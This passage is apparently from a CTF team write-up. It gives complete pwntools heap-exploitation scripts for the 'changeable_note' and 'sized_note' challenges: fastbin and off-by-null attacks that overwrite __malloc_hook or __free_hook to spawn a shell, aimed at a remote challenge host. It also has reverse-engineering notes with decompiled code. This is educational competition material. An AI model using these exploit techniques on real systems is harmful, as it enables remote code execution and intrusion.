add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
free(<span style="color:#ae81ff">0</span>)
free(<span style="color:#ae81ff">1</span>)
free(<span style="color:#ae81ff">0</span>)
add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x60</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__malloc_hook&#34;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x23</span>))

add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
<span style="color:#75715e"># gdb.attach(p, &#34;b add_note&#34;)</span>

print(hex(libc<span style="color:#f92672">.</span>address))
add(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf03a4</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>))
free(<span style="color:#ae81ff">0</span>)
free(<span style="color:#ae81ff">0</span>)
<span style="color:#75715e"># free(2)</span>

p<span style="color:#f92672">.</span>interactive()

<span style="color:#75715e"># 0x45226 execve(&#34;/bin/sh&#34;, rsp+0x30, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   rax == NULL</span>

<span style="color:#75715e"># 0x4527a execve(&#34;/bin/sh&#34;, rsp+0x30, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsp+0x30] == NULL</span>

<span style="color:#75715e"># 0xf03a4 execve(&#34;/bin/sh&#34;, rsp+0x50, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsp+0x50] == NULL</span>

<span style="color:#75715e"># 0xf1247 execve(&#34;/bin/sh&#34;, rsp+0x70, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsp+0x70] == NULL</span>
</code></pre></div><h3 id="pwnchangeable_note">[Pwn]changeable_note</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<p>2.23 打 <code>stdout</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./note&#34;</span>)
p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">52401</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proof</span>(y):
    may <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> may:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> may:
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> may:
                <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> may:
                    res <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span>j <span style="color:#f92672">+</span>k <span style="color:#f92672">+</span>l
                    <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha256((res)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> y:
                        p<span style="color:#f92672">.</span>sendline(res)
                        <span style="color:#66d9ef">return</span>
    print(<span style="color:#e6db74">&#39;Wrong!&#39;</span>)


p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; == &#34;</span>)
a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
print(a)
proof(a)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(i):
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4. farewell&#34;</span>, str(i))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, size, content):
    menu(<span style="color:#ae81ff">1</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;size?&#34;</span>, str(size))
    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;content?&#34;</span>, content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, content):
    menu(<span style="color:#ae81ff">2</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt; &#34;</span>, str(idx))
    p<span style="color:#f92672">.</span>sendline(content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
    menu(<span style="color:#ae81ff">3</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))


add(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0x60</span>,p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x41</span>))
add(<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)

edit(<span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x21</span>))
edit(<span style="color:#ae81ff">0</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xe1</span>))
free(<span style="color:#ae81ff">1</span>)
free(<span style="color:#ae81ff">2</span>)

add(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0x20</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdd\x25</span><span style="color:#e6db74">&#34;</span>)
add(<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
edit(<span style="color:#ae81ff">6</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71</span><span style="color:#e6db74">&#34;</span>)
add(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdd\x25</span><span style="color:#e6db74">&#34;</span>)
add(<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x33</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xfbad1887</span>) <span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0x88</span>))
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;_IO_2_1_stdin_&#39;</span>]
print(hex(libc<span style="color:#f92672">.</span>address))
edit(<span style="color:#ae81ff">0</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xe1</span>))
free(<span style="color:#ae81ff">9</span>)
free(<span style="color:#ae81ff">5</span>)
add(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">0x20</span>,p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__malloc_hook&#34;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x23</span>))
add(<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
edit(<span style="color:#ae81ff">6</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71</span><span style="color:#e6db74">&#34;</span>)
add(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)

add(<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf03a4</span>))

<span style="color:#75715e"># gdb.attach(p, &#34;b edit_note&#34;)</span>
edit(<span style="color:#ae81ff">6</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span>)
free(<span style="color:#ae81ff">9</span>)


p<span style="color:#f92672">.</span>interactive()

<span style="color:#75715e"># 0x45226 execve(&#34;/bin/sh&#34;, rsp+0x30, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   rax == NULL</span>

<span style="color:#75715e"># 0x4527a execve(&#34;/bin/sh&#34;, rsp+0x30, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsp+0x30] == NULL</span>

<span style="color:#75715e"># 0xf03a4 execve(&#34;/bin/sh&#34;, rsp+0x50, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsp+0x50] == NULL</span>

<span style="color:#75715e"># 0xf1247 execve(&#34;/bin/sh&#34;, rsp+0x70, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsp+0x70] == NULL</span>
</code></pre></div><h3 id="pwnsized_note">[Pwn]sized_note</h3>
<blockquote>
<p>By triplewings</p>
</blockquote>
<p>off by null, unlink unsorted bins</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)

p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./note&#34;</span>)
p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chuj.top&#34;</span>, <span style="color:#ae81ff">52966</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proof</span>(y):
    may <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> may:
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> may:
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> may:
                <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> may:
                    res <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span>j <span style="color:#f92672">+</span>k <span style="color:#f92672">+</span>l
                    <span style="color:#66d9ef">if</span> hashlib<span style="color:#f92672">.</span>sha256((res)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> y:
                        p<span style="color:#f92672">.</span>sendline(res)
                        <span style="color:#66d9ef">return</span>
    print(<span style="color:#e6db74">&#39;Wrong!&#39;</span>)


p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; == &#34;</span>)
a <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
print(a)
proof(a)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>(i):
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5. farewell&#34;</span>, str(i))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, size, content):
    menu(<span style="color:#ae81ff">1</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;size?&#34;</span>, str(size))
    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;content?&#34;</span>, content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, content):
    menu(<span style="color:#ae81ff">4</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&gt; &#34;</span>, str(idx))
    p<span style="color:#f92672">.</span>send(content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(idx):
    menu(<span style="color:#ae81ff">3</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
    menu(<span style="color:#ae81ff">2</span>)
    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index?&#34;</span>, str(idx))





add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)
add(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
    add(<span style="color:#ae81ff">4</span><span style="color:#f92672">+</span>i, <span style="color:#ae81ff">0xf8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaa&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
    free(<span style="color:#ae81ff">10</span> <span style="color:#f92672">-</span> i)

free(<span style="color:#ae81ff">1</span>)
free(<span style="color:#ae81ff">0</span>)

add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x80</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x90</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>))
free(<span style="color:#ae81ff">2</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
    add(<span style="color:#ae81ff">4</span><span style="color:#f92672">+</span>i, <span style="color:#ae81ff">0xf8</span>,<span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xf8</span>,<span style="color:#e6db74">&#34;cccc&#34;</span>)
show(<span style="color:#ae81ff">1</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">96</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>]
print(hex(libc<span style="color:#f92672">.</span>address))
<span style="color:#75715e"># gdb.attach(p, &#34;b *$rebase(0x144B)&#34;)</span>
add(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x88</span>,<span style="color:#e6db74">&#34;cccc&#34;</span>)
free(<span style="color:#ae81ff">2</span>)
edit(<span style="color:#ae81ff">1</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__free_hook&#34;</span>])[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
add(<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">0x88</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;__free_hook&#34;</span>]))

add(<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0x88</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]))
free(<span style="color:#ae81ff">5</span>)



p<span style="color:#f92672">.</span>interactive()

<span style="color:#75715e"># 0x4f3d5 execve(&#34;/bin/sh&#34;, rsp+0x40, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   rsp &amp; 0xf == 0</span>
<span style="color:#75715e">#   rcx == NULL</span>

<span style="color:#75715e"># 0x4f432 execve(&#34;/bin/sh&#34;, rsp+0x40, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsp+0x40] == NULL</span>

<span style="color:#75715e"># 0x10a41c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)</span>
<span style="color:#75715e"># constraints:</span>
<span style="color:#75715e">#   [rsp+0x70] == NULL</span>
</code></pre></div><h3 id="reanswers-windows">[RE]Answer&rsquo;s windows</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>使用 <code>right.png</code> 字符串能够定位到验证函数</p>
<p>动调发现使用了 string 的存储方式（好像就是把 string 内联了），只使用了 Base64 编码</p>
<p>但 base 表和目标对应不上，显然是有反调试，自己做的时候直接猜到了真实表是 ascii 的前 64 个可见字符</p>
<p>或者根据交叉引用找到 debug，把反调试判断 <code>nop</code> 掉再动调即可</p>
<p><figure 
	>
	<a href="/AnswersWindows_solve.jpg" >
		<img src="/AnswersWindows_solve.jpg"
			
			
			
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="recreakme_3">[RE]creakme_3</h3>
<blockquote>
<p>By s0uthwood</p>
</blockquote>
<p>PPC 架构，用 ghidra 看的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)

{
  <span style="color:#66d9ef">int</span> fs;
  <span style="color:#66d9ef">int</span> randnum;
  <span style="color:#66d9ef">int</span> j;
  <span style="color:#66d9ef">int</span> order_cnt;
  <span style="color:#66d9ef">int</span> i;
  <span style="color:#66d9ef">int</span> order [<span style="color:#ae81ff">89</span>];
  <span style="color:#66d9ef">int</span> canary;
  
  canary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(fs <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x7008</span>);
  memset(order,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x164</span>);
  printf(<span style="color:#e6db74">&#34;Welcome my whitegive re task! This is your flag: &#34;</span>);
  <span style="color:#66d9ef">do</span> {
    <span style="color:#66d9ef">for</span> (j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x59</span>; j <span style="color:#f92672">=</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
      randnum <span style="color:#f92672">=</span> rand();
      order[j] <span style="color:#f92672">=</span> randnum <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x59</span>;
    }
    order_cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    <span style="color:#66d9ef">while</span> ((order_cnt <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x59</span> <span style="color:#f92672">&amp;&amp;</span> (a[order[order_cnt <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;=</span> a[order[order_cnt] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>])))
    {
      order_cnt <span style="color:#f92672">=</span> order_cnt <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
    }
  } <span style="color:#66d9ef">while</span> (order_cnt <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x59</span>);
  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x59</span>; i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
    putchar(a[order[i] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>]);
  }
  <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(fs <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x7008</span>)) {
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
  }
                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
  __stack_chk_fail();
}
</code></pre></div><p>手动恢复了一下符号，简单的说就是只有满足顺序都是 <code>&lt;=</code> 的时候才能退出第一个循环，所以 <code>rand()</code> 只是个忽悠人并且浪费时间的东西（后来知道这个东西叫猴子加密）</p>
<p>所以提取一下数字然后排序就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">a <span style="color:#f92672">=</span> [
    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x4E7D</span>),
    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x67BD</span>),
    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x7A48</span>),
    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x82A2</span>),
    (<span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x933E</span>),
    (<span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x9C18</span>),
    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x5AFF</span>),
    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x6CD7</span>),
    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xA6CA</span>),
    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xBD79</span>),
    (<span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0xCEBD</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x324A</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x3292</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x3905</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x4291</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x5ADE</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x6E9F</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0xA52A</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0xBE35</span>),
    (<span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0xCB63</span>),
    (<span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x7F3B</span>),
    (<span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x3914</span>),
    (<span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xB2AD</span>),
    (<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x38DA</span>),
    (<span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x4E50</span>),
